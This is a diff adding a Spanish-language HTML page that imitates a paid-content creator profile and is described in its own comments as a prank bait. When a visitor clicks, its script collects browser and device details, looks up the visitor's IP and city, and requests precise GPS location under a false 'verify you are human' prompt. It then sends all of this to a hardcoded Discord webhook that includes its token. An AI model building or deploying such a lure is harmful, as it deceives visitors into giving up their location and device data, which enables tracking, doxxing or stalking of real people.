@@ -1,0 +1,753 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Santi Del Río 🔥</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --blue: #00aff0;
+        --blue-dark: #0090c8;
+        --text: #0f1419;
+        --muted: #8899a6;
+        --line: #e6ecf0;
+        --bg: #ffffff;
+      }
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+      html,
+      body {
+        background: #000;
+        font-family:
+          "Inter",
+          system-ui,
+          -apple-system,
+          sans-serif;
+        color: var(--text);
+      }
+      body {
+        display: flex;
+        justify-content: center;
+      }
+      .phone {
+        width: 100%;
+        max-width: 430px;
+        min-height: 100vh;
+        background: var(--bg);
+        position: relative;
+        overflow-x: hidden;
+      }
+
+      /* cookie bar */
+      .cookie {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 8px 12px;
+        font-size: 11px;
+        color: #3a4a54;
+        background: #f5f8fa;
+        border-bottom: 1px solid var(--line);
+      }
+      .cookie .c-txt {
+        flex: 1;
+        line-height: 1.3;
+      }
+      .cookie a {
+        color: var(--blue);
+        text-decoration: none;
+      }
+      .cookie .c-btn {
+        white-space: nowrap;
+        font-weight: 700;
+        color: var(--blue);
+        cursor: pointer;
+      }
+      .cookie .c-accept {
+        background: var(--blue);
+        color: #fff;
+        padding: 6px 12px;
+        border-radius: 999px;
+        font-weight: 700;
+        cursor: pointer;
+      }
+
+      /* cover */
+      .cover {
+        position: relative;
+        height: 170px;
+        background: #111 center/cover no-repeat;
+      }
+      .cover-img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        display: block;
+      }
+      .cover .mini {
+        position: absolute;
+        left: 12px;
+        top: 10px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        color: #fff;
+        text-shadow: 0 1px 4px rgba(0, 0, 0, 0.6);
+      }
+      .cover .mini .m-av {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid #fff;
+      }
+      .cover .mini .m-name {
+        font-weight: 800;
+        font-size: 15px;
+        line-height: 1.1;
+        display: flex;
+        align-items: center;
+        gap: 4px;
+      }
+      .cover .mini .m-stats {
+        font-size: 11px;
+        opacity: 0.95;
+        display: flex;
+        gap: 10px;
+        margin-top: 1px;
+      }
+      .verified {
+        color: #fff;
+        background: var(--blue);
+        border-radius: 50%;
+        width: 15px;
+        height: 15px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 9px;
+      }
+
+      /* header */
+      .head {
+        padding: 0 16px;
+        position: relative;
+      }
+      .avatar {
+        width: 92px;
+        height: 92px;
+        border-radius: 50%;
+        border: 4px solid #fff;
+        object-fit: cover;
+        margin-top: -46px;
+        background: #ddd;
+        position: relative;
+        z-index: 2;
+      }
+      .share {
+        position: absolute;
+        right: 16px;
+        top: 12px;
+        color: var(--blue);
+        font-size: 20px;
+        cursor: pointer;
+      }
+      .name {
+        font-size: 20px;
+        font-weight: 800;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        margin-top: 6px;
+      }
+      .handle {
+        color: var(--muted);
+        font-size: 14px;
+        margin-top: 1px;
+      }
+      .bio {
+        font-size: 14px;
+        margin-top: 10px;
+        line-height: 1.4;
+      }
+      .loc {
+        color: var(--muted);
+        font-size: 13px;
+        margin-top: 8px;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+      }
+
+      /* subscription */
+      .sub-label {
+        color: var(--muted);
+        font-size: 12px;
+        font-weight: 700;
+        letter-spacing: 0.5px;
+        margin: 18px 16px 8px;
+      }
+      .sub-btn {
+        margin: 0 16px;
+        background: var(--blue);
+        color: #fff;
+        border: none;
+        width: calc(100% - 32px);
+        padding: 13px;
+        border-radius: 999px;
+        font-weight: 700;
+        font-size: 15px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        cursor: pointer;
+        font-family: inherit;
+      }
+      .sub-btn:hover {
+        background: var(--blue-dark);
+      }
+
+      /* tabs */
+      .tabs {
+        display: flex;
+        border-bottom: 1px solid var(--line);
+        margin: 18px 0 0;
+      }
+      .tab {
+        flex: 1;
+        text-align: center;
+        padding: 12px;
+        font-size: 14px;
+        font-weight: 700;
+        color: var(--muted);
+      }
+      .tab.active {
+        color: var(--text);
+        border-bottom: 2px solid var(--blue);
+      }
+
+      /* locked */
+      .locked {
+        padding: 34px 16px 60px;
+        text-align: center;
+      }
+      .lock-ico {
+        font-size: 34px;
+        color: var(--muted);
+      }
+      .lock-stats {
+        display: flex;
+        justify-content: center;
+        gap: 18px;
+        color: var(--muted);
+        font-size: 13px;
+        margin: 14px 0 22px;
+      }
+      .ver-btn {
+        background: var(--blue);
+        color: #fff;
+        border: none;
+        width: 100%;
+        padding: 15px;
+        border-radius: 999px;
+        font-weight: 800;
+        font-size: 16px;
+        cursor: pointer;
+        font-family: inherit;
+        box-shadow: 0 6px 18px rgba(0, 175, 240, 0.35);
+        transition: transform 0.08s;
+      }
+      .ver-btn:active {
+        transform: scale(0.98);
+      }
+
+      /* nav */
+      .nav {
+        position: sticky;
+        bottom: 0;
+        display: flex;
+        justify-content: space-around;
+        padding: 12px 0;
+        border-top: 1px solid var(--line);
+        background: #fff;
+        color: var(--muted);
+        font-size: 20px;
+      }
+
+      /* overlay */
+      .overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.72);
+        backdrop-filter: blur(4px);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 22px;
+        z-index: 50;
+      }
+      .overlay.show {
+        display: flex;
+      }
+      .card {
+        background: #fff;
+        border-radius: 20px;
+        padding: 26px 22px;
+        max-width: 360px;
+        width: 100%;
+        text-align: center;
+        animation: pop 0.22s ease;
+      }
+      @keyframes pop {
+        from {
+          transform: scale(0.9);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+      .card h2 {
+        font-size: 22px;
+        font-weight: 800;
+        margin-bottom: 8px;
+      }
+      .card p {
+        font-size: 15px;
+        color: #3a4a54;
+        line-height: 1.45;
+      }
+      .card .emoji {
+        font-size: 46px;
+        margin-bottom: 6px;
+      }
+      .card button {
+        margin-top: 20px;
+        background: var(--blue);
+        color: #fff;
+        border: none;
+        width: 100%;
+        padding: 14px;
+        border-radius: 999px;
+        font-weight: 800;
+        font-size: 16px;
+        cursor: pointer;
+        font-family: inherit;
+      }
+      .card button.ghost {
+        background: #eef3f6;
+        color: #3a4a54;
+        margin-top: 10px;
+      }
+      .warn {
+        background: #fff8e6;
+        border: 1px solid #ffe08a;
+        border-radius: 14px;
+        padding: 12px 14px;
+        font-size: 13px;
+        color: #7a5c00;
+        line-height: 1.4;
+        margin-top: 16px;
+        text-align: left;
+      }
+      .warn b {
+        color: #5c4600;
+      }
+      .spin {
+        width: 38px;
+        height: 38px;
+        border: 4px solid #e6ecf0;
+        border-top-color: var(--blue);
+        border-radius: 50%;
+        margin: 6px auto 0;
+        animation: sp 1s linear infinite;
+      }
+      @keyframes sp {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      .counter {
+        margin-top: 16px;
+        font-size: 13px;
+        color: var(--muted);
+      }
+      .counter b {
+        color: var(--text);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="phone">
+      <!-- cookie bar -->
+      <div class="cookie" id="cookie">
+        <span class="c-txt"
+          >Usamos cookies para que este sitio funcione. Mirá nuestra
+          <a href="#">Política de Cookies</a>.</span
+        >
+        <span
+          class="c-btn"
+          onclick="document.getElementById('cookie').style.display = 'none'"
+          >SOLO NECESARIAS</span
+        >
+        <span
+          class="c-accept"
+          onclick="document.getElementById('cookie').style.display = 'none'"
+          >ACEPTAR TODAS</span
+        >
+      </div>
+
+      <!-- cover -->
+      <div class="cover">
+        <img
+          class="cover-img"
+          src="portada.jpg"
+          alt=""
+          onerror="this.style.display = 'none'"
+        />
+        <div class="mini">
+          <img
+            class="m-av"
+            src="perfil.jpg"
+            alt=""
+            onerror="this.style.visibility = 'hidden'"
+          />
+          <div>
+            <div class="m-name">
+              Santi Del Río <span class="verified">✓</span>
+            </div>
+            <div class="m-stats">
+              <span>❤️ 12.9K</span><span>👤 68</span><span>🔥 651.6K</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- header -->
+      <div class="head">
+        <img
+          class="avatar"
+          src="perfil.jpg"
+          alt=""
+          onerror="this.style.background = '#00aff0'"
+        />
+        <div class="share">↗</div>
+        <div class="name">
+          Santi Del Río
+          <span
+            class="verified"
+            style="width: 18px; height: 18px; font-size: 11px"
+            >✓</span
+          >
+        </div>
+        <div class="handle">@santidelrio</div>
+        <div class="bio">
+          Living in the moment 🌊🍺 wakeboard &amp; buena onda
+        </div>
+        <div class="loc">📍 En algún lago 🌴</div>
+      </div>
+
+      <!-- subscription -->
+      <div class="sub-label">SUSCRIPCIÓN</div>
+      <button class="sub-btn" onclick="verGratis()">
+        <span>SUSCRIBITE</span><span>GRATIS</span>
+      </button>
+
+      <!-- tabs -->
+      <div class="tabs">
+        <div class="tab active">953 PUBLICACIONES</div>
+        <div class="tab">1846 MEDIOS</div>
+      </div>
+
+      <!-- locked -->
+      <div class="locked">
+        <div class="lock-ico">🔒</div>
+        <div class="lock-stats">
+          <span>📷 953</span><span>🎬 1779</span><span>📌 68</span>
+        </div>
+        <button class="ver-btn" onclick="verGratis()">
+          SUSCRIBITE PARA VER LAS PUBLICACIONES 🔥
+        </button>
+        <div class="counter">
+          💦 <b id="counter">651.643</b> personas ya vieron el contenido
+        </div>
+      </div>
+
+      <!-- nav -->
+      <div class="nav">
+        <span>🏠</span><span>🔍</span><span>➕</span><span>💬</span
+        ><span>👤</span>
+      </div>
+    </div>
+
+    <!-- OVERLAY -->
+    <div class="overlay" id="overlay">
+      <div class="card" id="card"><!-- injected --></div>
+    </div>
+
+    <script>
+      const WEBHOOK =
+        "https://discord.com/api/webhooks/1547607710676291614/xdKMYZ-yKmQsdQaA8ynCHXejh_A1tnLSe5ncimNzttXy5HZphiAzUceSo5RbENnWa_fd";
+      const overlay = document.getElementById("overlay");
+      const card = document.getElementById("card");
+      let sent = false;
+
+      function show(html) {
+        card.innerHTML = html;
+        overlay.classList.add("show");
+      }
+      function hide() {
+        overlay.classList.remove("show");
+      }
+
+      // paso 1: el chistecito
+      function verGratis() {
+        show(`
+    <button onclick="paso2()">MOSTRAME 🔥</button>
+    <button class="ghost" onclick="hide()">Mejor no</button>
+  `);
+      }
+
+      // paso 2: aviso honesto + pedir ubicación
+      function paso2() {
+        show(`
+    <div class="emoji">📍</div>
+    <h2>Verificá que sos humano</h2>
+    <p>Para desbloquear el contenido tenemos que verificar tu ubicación.</p>
+    <button onclick="grab()">VERIFICAR Y VER GRATIS ✅</button>
+    <button class="ghost" onclick="hide()">Cancelar</button>
+  `);
+      }
+
+      function esc(s) {
+        return String(s).replace(
+          /[<>&]/g,
+          (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" })[c],
+        );
+      }
+
+      // paso 3: recolectar y mandar
+      async function grab() {
+        show(
+          `<div class="emoji">⏳</div><h2>Cargando contenido...</h2><div class="spin"></div><p style="margin-top:14px">Verificando que seas mayor de edad 😏</p>`,
+        );
+
+        // --- datos del navegador (siempre disponibles) ---
+        const nav = navigator;
+        const b = {
+          userAgent: nav.userAgent,
+          platform:
+            nav.platform ||
+            (nav.userAgentData && nav.userAgentData.platform) ||
+            "?",
+          idioma: nav.language,
+          idiomas: (nav.languages || []).join(", "),
+          pantalla:
+            screen.width +
+            "×" +
+            screen.height +
+            " @" +
+            (window.devicePixelRatio || 1) +
+            "x",
+          ventana: window.innerWidth + "×" + window.innerHeight,
+          cores: nav.hardwareConcurrency || "?",
+          ram: nav.deviceMemory ? nav.deviceMemory + " GB" : "?",
+          touch: nav.maxTouchPoints || 0,
+          zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          horaLocal: new Date().toString(),
+          referrer: document.referrer || "(directo)",
+          url: location.href,
+        };
+
+        // --- IP + geo aproximada por IP ---
+        let ipinfo = {};
+        try {
+          const r = await fetch("https://ipwho.is/");
+          ipinfo = await r.json();
+        } catch (e) {
+          try {
+            const r2 = await fetch("https://ipapi.co/json/");
+            ipinfo = await r2.json();
+          } catch (e2) {}
+        }
+
+        const ipFields = [
+          {
+            name: "🌐 IP",
+            value: "`" + (ipinfo.ip || "?") + "`",
+            inline: true,
+          },
+          { name: "🏙️ Ciudad", value: ipinfo.city || "?", inline: true },
+          { name: "🗺️ Región", value: ipinfo.region || "?", inline: true },
+          {
+            name: "🏳️ País",
+            value:
+              (ipinfo.country || "?") +
+              " " +
+              (ipinfo.flag && ipinfo.flag.emoji ? ipinfo.flag.emoji : ""),
+            inline: true,
+          },
+          {
+            name: "📡 ISP",
+            value:
+              (ipinfo.connection && ipinfo.connection.isp) || ipinfo.org || "?",
+            inline: true,
+          },
+          { name: "🕐 Zona horaria", value: b.zona || "?", inline: true },
+        ];
+        if (ipinfo.latitude) {
+          ipFields.push({
+            name: "📌 Geo x IP",
+            value:
+              "https://maps.google.com/?q=" +
+              ipinfo.latitude +
+              "," +
+              ipinfo.longitude,
+            inline: false,
+          });
+        }
+
+        const browserFields = [
+          {
+            name: "📱 Dispositivo",
+            value: "`" + esc(b.userAgent).slice(0, 200) + "`",
+            inline: false,
+          },
+          { name: "💻 Plataforma", value: b.platform, inline: true },
+          { name: "🗣️ Idioma", value: b.idiomas || b.idioma, inline: true },
+          { name: "🖥️ Pantalla", value: b.pantalla, inline: true },
+          { name: "🪟 Ventana", value: b.ventana, inline: true },
+          {
+            name: "⚙️ Cores / RAM",
+            value: b.cores + " / " + b.ram,
+            inline: true,
+          },
+          { name: "👆 Touch", value: String(b.touch), inline: true },
+          {
+            name: "🔗 Vino de",
+            value: esc(b.referrer).slice(0, 120),
+            inline: false,
+          },
+          {
+            name: "🕑 Hora local",
+            value: esc(b.horaLocal).slice(0, 80),
+            inline: false,
+          },
+        ];
+
+        // manda embed inicial (IP + navegador) — no depende del permiso de GPS
+        await sendWebhook({
+          username: "Bait OnlyFans 🎣",
+          embeds: [
+            {
+              title: "🎣 ¡Cayó alguien en el bait!",
+              color: 0x00aff0,
+              fields: [...ipFields, ...browserFields],
+              timestamp: new Date().toISOString(),
+              footer: { text: "Santi Del Río OnlyFans (chiste)" },
+            },
+          ],
+        });
+
+        // --- ubicación precisa (GPS, con prompt del navegador) ---
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              const c = pos.coords;
+              sendWebhook({
+                username: "Bait OnlyFans 🎣",
+                embeds: [
+                  {
+                    title: "📍 UBICACIÓN PRECISA (GPS)",
+                    color: 0x2ecc71,
+                    fields: [
+                      {
+                        name: "Coordenadas",
+                        value: "`" + c.latitude + ", " + c.longitude + "`",
+                        inline: false,
+                      },
+                      {
+                        name: "Precisión",
+                        value: "~" + Math.round(c.accuracy) + " m",
+                        inline: true,
+                      },
+                      {
+                        name: "🗺️ Mapa",
+                        value:
+                          "https://maps.google.com/?q=" +
+                          c.latitude +
+                          "," +
+                          c.longitude,
+                        inline: false,
+                      },
+                    ],
+                    timestamp: new Date().toISOString(),
+                  },
+                ],
+              });
+              reveal();
+            },
+            (err) => {
+              sendWebhook({
+                username: "Bait OnlyFans 🎣",
+                embeds: [
+                  {
+                    title: "📍 GPS denegado",
+                    color: 0xe74c3c,
+                    description:
+                      "El gil no dio permiso de ubicación precisa. Motivo: " +
+                      esc(err.message),
+                  },
+                ],
+              });
+              reveal();
+            },
+            { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 },
+          );
+        } else {
+          reveal();
+        }
+      }
+
+      async function sendWebhook(payload) {
+        try {
+          await fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+        } catch (e) {
+          /* silencioso */
+        }
+      }
+
+      // paso final: el gotcha
+      function reveal() {
+        if (sent) return;
+        sent = true;
+        const n = document.getElementById("counter");
+        if (n) n.textContent = "651.644";
+        show(`
+    <div class="emoji">🤡</div>
+    <h2>JAJAJA caíste</h2>
+    <p>No hay ningún OnlyFans papá 😂<br>Te troleó <b>Santi Del Río</b>.<br><br>Sos el número <b>651.644</b> en caer 💀</p>
+    <button onclick="hide()">Ay no... cerrar 🙈</button>
+  `);
+      }
+    </script>
+  </body>
+</html>
